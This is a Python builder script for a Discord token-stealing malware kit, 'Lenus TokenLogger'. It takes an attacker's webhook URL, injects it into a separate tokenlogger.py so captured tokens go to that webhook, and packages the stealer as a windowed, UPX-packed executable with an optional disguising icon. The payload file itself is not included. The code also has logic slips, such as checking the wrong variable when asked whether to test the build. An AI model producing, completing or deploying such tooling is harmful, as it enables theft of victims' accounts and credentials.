from pystyle import *
from colorama import *
from tkinter import filedialog, Tk
import os
import time
import ctypes


ctypes.windll.kernel32.SetConsoleTitleW(f" Lenus TokenLogger ")
os.system("cls")

text = """
      ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
      ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
         ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
         ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
         ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
         ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝                                                                                                                                       
"""


text2 = """
      ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
      ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
         ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
         ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
         ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
         ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝                                                                                        
"""

print(text2)

time.sleep(1.5)
def endHandler():
  os._exit(0)

def checkhook(webhook):
    if not "api/webhooks" in webhook:
        print(f"\n{Fore.RED}Invalid webhook{Fore.RESET}")
        time.sleep(1)
        endHandler()

webhook = input(Fore.WHITE + f"{Fore.YELLOW}[!] {Fore.WHITE}Enter webhook URL: " + Style.RESET_ALL)
checkhook(webhook)
filename = "tokenlogger.py"
filepath = os.path.join(os.getcwd(), filename)
with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()
new_content = content.replace('"YOUR_WEBHOOK_URL"', f'"{webhook}"')
with open(filepath, "w", encoding="utf-8") as f:
        f.write(new_content)
        time.sleep(1)
        os.system("cls")
        print(text2)
        icon_file = None  # Initialize icon_file with None
        answer = input(Fore.WHITE + f"{Fore.YELLOW}[!] {Fore.WHITE}Do you want to build an EXE file? | (Y/N) " + Style.RESET_ALL)
        if answer.upper() == "Y":
              time.sleep(1)
              answer = input(Fore.WHITE + f"{Fore.YELLOW}[!] {Fore.WHITE}Do you want to add an icon? | (Y/N) " + Style.RESET_ALL)
              if answer.upper() == "Y":
                    print(Fore.YELLOW + "Build process has been started please wait..." + Style.RESET_ALL)
                    Tk().withdraw()  
                    icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
              if icon_file and icon_file.endswith('.ico'):
                    os.system(f"pyinstaller --noconfirm --onefile --windowed --upx-dir=./CStealer_assets/upx --icon {icon_file} {filename}")
                    print(f"\n{Fore.GREEN}{filename} has been converted to EXE with the selected icon.{Fore.RESET}")
              else:
                    print(Fore.YELLOW + "Reminder: File you choose must be have .ico extension!" + Style.RESET_ALL)
                    os.system (f"pyinstaller --noconfirm --onefile --windowed --upx-dir=./CStealer_assets/upx {filename}")
                    print(f"\n{Fore.GREEN}File successfully builded{Fore.RESET}")
                    time.sleep(2)
                    os.system("cls")
                    print(text2)
        elif answer.upper() == "N":
                    time.sleep(2)
                    os.system("cls")
                    print(text2)

        run = input(Fore.WHITE + f"{Fore.YELLOW}[!] {Fore.WHITE}Do you want to test the build? (Y/N) " + Style.RESET_ALL)
        if answer.upper() == "Y":
                    os.system (f"{filename}")
                    time.sleep(1)
                    os.system("cls")
                    print(text2) 
                    print(f"\n{Fore.WHITE}Build process has been done successfully!{Fore.RESET}")
                    time.sleep(1)
        elif answer.upper() == "N":
              print(f"\n{Fore.WHITEN}Build process has been done successfully!{Fore.RESET}")
              time.sleep(1)
              endHandler()